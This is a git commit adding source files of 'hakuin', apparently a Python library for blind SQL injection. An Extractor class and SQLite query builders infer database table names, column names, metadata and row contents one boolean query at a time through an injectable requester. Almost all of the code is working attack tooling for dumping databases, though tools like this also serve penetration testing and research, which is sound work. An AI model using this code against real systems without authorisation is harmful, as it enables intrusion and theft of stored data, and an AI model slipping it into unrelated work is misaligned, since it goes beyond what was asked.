75887ca6e528443dd48739824f9d84fa2693b134
Bot <41898282+github-actions[bot]@users.noreply.github.com>
2023-10-29 15:04:22 +0000

    Add package hakuin/0.1.2/hakuin-0.1.2-py3-none-any.whl

---
+++ packages/hakuin/hakuin-0.1.2-py3-none-any.whl/hakuin/Extractor.py
@@ -0,0 +1,220 @@
+import hakuin
+import hakuin.search_algorithms as search_alg
+import hakuin.collectors as collect
+
+
+
+class Extractor:
+    '''Class for extracting DB.'''
+    def __init__(self, requester, dbms):
+        '''Constructor.
+
+        Params:
+            requester (Requester): Requester instance used to inject queries
+            dbms (DBMS): DBMS instance used to construct queries
+        '''
+        self.requester = requester
+        self.dbms = dbms
+
+
+    def extract_table_names(self, strategy='model'):
+        '''Extracts table names.
+
+        Params:
+            strategy (str): 'binary' for binary search or 'model' for pre-trained
+                            models with Huffman trees
+
+        Returns:
+            list: list of extracted table names
+        '''
+        allowed = ['binary', 'model']
+        assert strategy in allowed, f'Invalid strategy: {strategy} not in {allowed}'
+
+        ctx = search_alg.Context(None, None, None, None)
+
+        n_rows = search_alg.IntExponentialBinarySearch(
+            requester=self.requester,
+            query_cb=self.dbms.TablesQueries.rows_count,
+            lower=0,
+            upper=8,
+            find_lower=False,
+            find_upper=True,
+        ).run(ctx)
+
+        if strategy == 'binary':
+            return collect.BinaryTextCollector(
+                requester=self.requester,
+                queries=self.dbms.TablesQueries,
+            ).run(ctx, n_rows)
+        else:
+            return collect.ModelTextCollector(
+                requester=self.requester,
+                queries=self.dbms.TablesQueries,
+                model=hakuin.get_model_tables(),
+            ).run(ctx, n_rows)
+
+
+    def extract_column_names(self, table, strategy='model'):
+        '''Extracts table column names.
+
+        Params:
+            table (str): table name
+            strategy (str): 'binary' for binary search or 'model' for pre-trained
+                        models with Huffman trees
+
+        Returns:
+            list: list of extracted column names
+        '''
+        allowed = ['binary', 'model']
+        assert strategy in allowed, f'Invalid strategy: {strategy} not in {allowed}'
+
+        ctx = search_alg.Context(table, None, None, None)
+
+        n_rows = search_alg.IntExponentialBinarySearch(
+            requester=self.requester,
+            query_cb=self.dbms.ColumnsQueries.rows_count,
+            lower=0,
+            upper=8,
+            find_lower=False,
+            find_upper=True,
+        ).run(ctx)
+
+        if strategy == 'binary':
+            return collect.BinaryTextCollector(
+                requester=self.requester,
+                queries=self.dbms.ColumnsQueries,
+            ).run(ctx, n_rows)
+        else:
+            return collect.ModelTextCollector(
+                requester=self.requester,
+                queries=self.dbms.ColumnsQueries,
+                model=hakuin.get_model_columns(),
+            ).run(ctx, n_rows)
+
+
+    def extract_column_metadata(self, table, column):
+        '''Extracts column metadata (data type, nullable, and primary key).
+
+        Params:
+            table (str): table name
+            column (str): column name
+
+        Returns:
+            dict: column metadata
+        '''
+        ctx = search_alg.Context(table, column, None, None)
+
+        d_type = search_alg.BinarySearch(
+            requester=self.requester,
+            query_cb=self.dbms.MetaQueries.column_data_type,
+            values=self.dbms.DATA_TYPES,
+        ).run(ctx)
+
+        return {
+            'type': d_type,
+            'nullable': self.requester.request(ctx, self.dbms.MetaQueries.column_is_nullable(ctx)),
+            'pk': self.requester.request(ctx, self.dbms.MetaQueries.column_is_pk(ctx)),
+        }
+
+
+    def extract_schema(self, strategy='model', metadata=False):
+        '''Extracts schema.
+
+        Params:
+            strategy (str): 'binary' for binary search or 'model' for pre-trained
+                            models with Huffman trees
+            metadata (bool): if set, the metadata will be extracted as well
+
+        Returns:
+            dict: schema
+        '''
+        allowed = ['binary', 'model']
+        assert strategy in allowed, f'Invalid strategy: {strategy} not in {allowed}'
+
+        schema = {}
+        for table in self.extract_table_names(strategy):
+            schema[table] = {}
+            for column in self.extract_column_names(table, strategy):
+                md = self.extract_column_metadata(table, column) if metadata else None
+                schema[table][column] = md
+
+        return schema
+
+
+    def extract_column_text(self, table, column, strategy='dynamic', charset=None, n_rows_guess=128):
+        '''Extracts text column.
+
+        Params:
+            table (str): table name
+            column (str): column name
+            strategy (str): 'binary' for binary search or
+                        'unigram' for adaptive unigram model with Huffman trees or
+                        'fivegram' for adaptive five-gram model with Huffman trees or
+                        'dynamic' for dynamically choosing the best search strategy and
+                                         opportunistically guessing strings
+            charset (list|None): list of possible characters
+            n_rows_guess (int|None): approximate number of rows when 'n_rows' is not set
+
+        Returns:
+            list: list of strings in the column
+        '''
+        allowed = ['binary', 'unigram', 'fivegram', 'dynamic']
+        assert strategy in allowed, f'Invalid strategy: {strategy} not in {allowed}'
+
+        ctx = search_alg.Context(table, column, None, None)
+        n_rows = search_alg.IntExponentialBinarySearch(
+            requester=self.requester,
+            query_cb=self.dbms.RowsQueries.rows_count,
+            lower=0,
+            upper=n_rows_guess,
+            find_lower=False,
+            find_upper=True,
+        ).run(ctx)
+
+        if strategy == 'binary':
+            return collect.BinaryTextCollector(
+                requester=self.requester,
+                queries=self.dbms.RowsQueries,
+                charset=charset,
+            ).run(ctx, n_rows)
+        elif strategy in ['unigram', 'fivegram']:
+            ngram = 1 if strategy == 'unigram' else 5
+            return collect.AdaptiveTextCollector(
+                requester=self.requester,
+                queries=self.dbms.RowsQueries,
+                model=hakuin.Model(ngram),
+                charset=charset,
+            ).run(ctx, n_rows)
+        else:
+            return collect.DynamicTextCollector(
+                requester=self.requester,
+                queries=self.dbms.RowsQueries,
+                charset=charset,
+            ).run(ctx, n_rows)
+
+
+    def extract_column_int(self, table, column, n_rows_guess=128):
+        '''Extracts text column.
+
+        Params:
+            table (str): table name
+            column (str): column name
+            n_rows_guess (int|None): approximate number of rows when 'n_rows' is not set
+
+        Returns:
+            list: list of integers in the column
+        '''
+        ctx = search_alg.Context(table, column, None, None)
+        n_rows = search_alg.IntExponentialBinarySearch(
+            requester=self.requester,
+            query_cb=self.dbms.RowsQueries.rows_count,
+            lower=0,
+            upper=n_rows_guess,
+            find_lower=False,
+            find_upper=True,
+        ).run(ctx)
+
+        return collect.IntCollector(
+                requester=self.requester,
+                queries=self.dbms.RowsQueries,
+        ).run(ctx, n_rows)
---
+++ packages/hakuin/hakuin-0.1.2-py3-none-any.whl/hakuin/dbms/SQLite.py
@@ -0,0 +1,298 @@
+from hakuin.utils import EOS
+
+from .DBMS import DBMS, MetaQueries, UniformQueries
+
+
+
+class SQLiteMetaQueries(MetaQueries):
+    def column_data_type(self, ctx, values):
+        values = [f"'{v}'" for v in values]
+        query = f'''
+            SELECT  type in ({','.join(values)})
+            FROM    pragma_table_info(x'{self.hex(ctx.table)}')
+            WHERE   name=x'{self.hex(ctx.column)}'
+        '''
+        return self.normalize(query)
+
+
+    def column_is_nullable(self, ctx):
+        query = f'''
+            SELECT  [notnull] == 0
+            FROM    pragma_table_info(x'{self.hex(ctx.table)}')
+            WHERE   name=x'{self.hex(ctx.column)}'
+        '''
+        return self.normalize(query)
+
+
+    def column_is_pk(self, ctx):
+        query = f'''
+            SELECT  pk
+            FROM    pragma_table_info(x'{self.hex(ctx.table)}')
+            WHERE   name=x'{self.hex(ctx.column)}'
+        '''
+        return self.normalize(query)
+
+
+
+class SQLiteTablesQueries(UniformQueries):
+    def rows_count(self, ctx, n):
+        query = f'''
+            SELECT  count(*) < {n}
+            FROM    sqlite_master
+            WHERE   type='table'
+        '''
+        return self.normalize(query)
+
+
+    def rows_are_ascii(self, ctx):
+        # SQLite does not have native "isascii" function. As a workaround we try to look for
+        # non-ascii characters with "*[^\x01-0x7f]*" glob patterns. The pattern does not need to
+        # include the null terminator (0x00) because SQLite will never pass it to the GLOB expression.
+        # Also, the pattern is hex-encoded because SQLite does not support special characters in
+        # string literals. Lastly, sum() simulates the logical ANY operator here. Note that an empty string
+        # resolves to True, which is correct.
+        query = f'''
+            SELECT  sum(name not glob cast(x'2a5b5e012d7f5d2a' as TEXT))
+            FROM    sqlite_master
+            WHERE   type='table'
+        '''
+        return self.normalize(query)
+
+
+    def row_is_ascii(self, ctx):
+        query = f'''
+            SELECT  name not glob cast(x'2a5b5e012d7f5d2a' as TEXT)
+            FROM    sqlite_master
+            WHERE   type='table'
+            LIMIT   1
+            OFFSET  {ctx.row}
+        '''
+        return self.normalize(query)
+
+
+    def char_is_ascii(self, ctx):
+        query = f'''
+            SELECT  substr(name, {len(ctx.s) + 1}, 1) not glob cast(x'2a5b5e012d7f5d2a' as TEXT)
+            FROM    sqlite_master
+            WHERE   type='table'
+            LIMIT   1
+            OFFSET  {ctx.row}
+        '''
+        return self.normalize(query)
+
+
+    def char(self, ctx, values):
+        has_eos = EOS in values
+        values = [v for v in values if v != EOS]
+        values = ''.join(values).encode('utf-8').hex()
+
+        if has_eos:
+            query = f'''
+                SELECT  instr(x'{values}', substr(name, {len(ctx.s) + 1}, 1))
+                FROM    sqlite_master
+                WHERE   type='table'
+                LIMIT   1
+                OFFSET  {ctx.row}
+            '''
+        else:
+            query = f'''
+                SELECT  length(name) != {len(ctx.s)} AND
+                        instr(x'{values}', substr(name, {len(ctx.s) + 1}, 1))
+                FROM    sqlite_master
+                WHERE   type='table'
+                LIMIT   1
+                OFFSET  {ctx.row}
+            '''
+        return self.normalize(query)
+
+
+    def char_unicode(self, ctx, n):
+        query = f'''
+            SELECT  unicode(substr(name, {len(ctx.s) + 1}, 1)) < {n}
+            FROM    sqlite_master
+            WHERE   type='table'
+            LIMIT   1
+            OFFSET  {ctx.row}
+        '''
+        return self.normalize(query)
+
+
+    def string(self, ctx):
+        raise NotImplementedError('TODO?')
+
+
+
+class SQLiteColumnsQueries(UniformQueries):
+    def rows_count(self, ctx, n):
+        query = f'''
+            SELECT  count(*) < {n}
+            FROM    pragma_table_info(x'{self.hex(ctx.table)}')
+        '''
+        return self.normalize(query)
+
+
+    def rows_are_ascii(self, ctx):
+        query = f'''
+            SELECT  sum(name not glob cast(x'2a5b5e012d7f5d2a' as TEXT))
+            FROM    pragma_table_info(x'{self.hex(ctx.table)}')
+        '''
+        return self.normalize(query)
+
+
+    def row_is_ascii(self, ctx):
+        query = f'''
+            SELECT  name not glob cast(x'2a5b5e012d7f5d2a' as TEXT)
+            FROM    pragma_table_info(x'{self.hex(ctx.table)}')
+            LIMIT   1
+            OFFSET  {ctx.row}
+        '''
+        return self.normalize(query)
+
+
+    def char_is_ascii(self, ctx):
+        query = f'''
+            SELECT  substr(name, {len(ctx.s) + 1}, 1) not glob cast(x'2a5b5e012d7f5d2a' as TEXT)
+            FROM    pragma_table_info(x'{self.hex(ctx.table)}')
+            LIMIT   1
+            OFFSET  {ctx.row}
+        '''
+        return self.normalize(query)
+
+
+    def char(self, ctx, values):
+        has_eos = EOS in values
+        values = [v for v in values if v != EOS]
+        values = ''.join(values).encode('utf-8').hex()
+
+        if has_eos:
+            query = f'''
+                SELECT  instr(x'{values}', substr(name, {len(ctx.s) + 1}, 1))
+                FROM    pragma_table_info(x'{self.hex(ctx.table)}')
+                LIMIT   1
+                OFFSET  {ctx.row}
+            '''
+        else:
+            query = f'''
+                SELECT  length(name) != {len(ctx.s)} AND
+                        instr(x'{values}', substr(name, {len(ctx.s) + 1}, 1))
+                FROM    pragma_table_info(x'{self.hex(ctx.table)}')
+                LIMIT   1
+                OFFSET  {ctx.row}
+            '''
+        return self.normalize(query)
+
+
+    def char_unicode(self, ctx, n):
+        query = f'''
+            SELECT  unicode(substr(name, {len(ctx.s) + 1}, 1)) < {n}
+            FROM    pragma_table_info(x'{self.hex(ctx.table)}')
+            LIMIT   1
+            OFFSET  {ctx.row}
+        '''
+        return self.normalize(query)
+
+
+    def string(self, ctx):
+        raise NotImplementedError('TODO?')
+
+
+
+class SQLiteRowsQueries(UniformQueries):
+    def rows_count(self, ctx, n):
+        query = f'''
+            SELECT  count(*) < {n}
+            FROM    {SQLite.escape(ctx.table)}
+        '''
+        return self.normalize(query)
+
+
+    def rows_are_ascii(self, ctx):
+        query = f'''
+            SELECT  sum({SQLite.escape(ctx.column)} not glob cast(x'2a5b5e012d7f5d2a' as TEXT))
+            FROM    {SQLite.escape(ctx.table)}
+        '''
+        return self.normalize(query)
+
+
+    def row_is_ascii(self, ctx):
+        query = f'''
+            SELECT  {SQLite.escape(ctx.column)} not glob cast(x'2a5b5e012d7f5d2a' as TEXT)
+            FROM    {SQLite.escape(ctx.table)}
+            LIMIT   1
+            OFFSET  {ctx.row}
+        '''
+        return self.normalize(query)
+
+
+    def char_is_ascii(self, ctx):
+        query = f'''
+            SELECT  substr({SQLite.escape(ctx.column)}, {len(ctx.s) + 1}, 1) not glob cast(x'2a5b5e012d7f5d2a' as TEXT)
+            FROM    {SQLite.escape(ctx.table)}
+            LIMIT   1
+            OFFSET  {ctx.row}
+        '''
+        return self.normalize(query)
+
+
+    def char(self, ctx, values):
+        has_eos = EOS in values
+        values = [v for v in values if v != EOS]
+        values = ''.join(values).encode('utf-8').hex()
+
+        if has_eos:
+            query = f'''
+                SELECT  instr(x'{values}', substr({SQLite.escape(ctx.column)}, {len(ctx.s) + 1}, 1))
+                FROM    {SQLite.escape(ctx.table)}
+                LIMIT   1
+                OFFSET  {ctx.row}
+            '''
+        else:
+            query = f'''
+                SELECT  length({SQLite.escape(ctx.column)}) != {len(ctx.s)} AND
+                        instr(x'{values}', substr({SQLite.escape(ctx.column)}, {len(ctx.s) + 1}, 1))
+                FROM    {SQLite.escape(ctx.table)}
+                LIMIT   1
+                OFFSET  {ctx.row}
+            '''
+        return self.normalize(query)
+
+
+    def char_unicode(self, ctx, n):
+        query = f'''
+            SELECT  unicode(substr({SQLite.escape(ctx.column)}, {len(ctx.s) + 1}, 1)) < {n}
+            FROM    {SQLite.escape(ctx.table)}
+            LIMIT   1
+            OFFSET  {ctx.row}
+        '''
+        return self.normalize(query)
+
+
+    def string(self, ctx, values):
+        values = [f"x'{v.encode('utf-8').hex()}'" for v in values]
+        query = f'''
+            SELECT  cast({SQLite.escape(ctx.column)} as BLOB) in ({','.join(values)})
+            FROM    {SQLite.escape(ctx.table)}
+            LIMIT   1
+            OFFSET  {ctx.row}
+        '''
+        return self.normalize(query)
+
+
+    def int(self, ctx, n):
+        query = f'''
+            SELECT  {SQLite.escape(ctx.column)} < {n}
+            FROM    {SQLite.escape(ctx.table)}
+            LIMIT   1
+            OFFSET  {ctx.row}
+        '''
+        return self.normalize(query)
+
+
+
+class SQLite(DBMS):
+    DATA_TYPES = ['INTEGER', 'TEXT', 'REAL', 'NUMERIC', 'BLOB']
+
+    MetaQueries = SQLiteMetaQueries()
+    TablesQueries = SQLiteTablesQueries()
+    ColumnsQueries = SQLiteColumnsQueries()
+    RowsQueries = SQLiteRowsQueries()
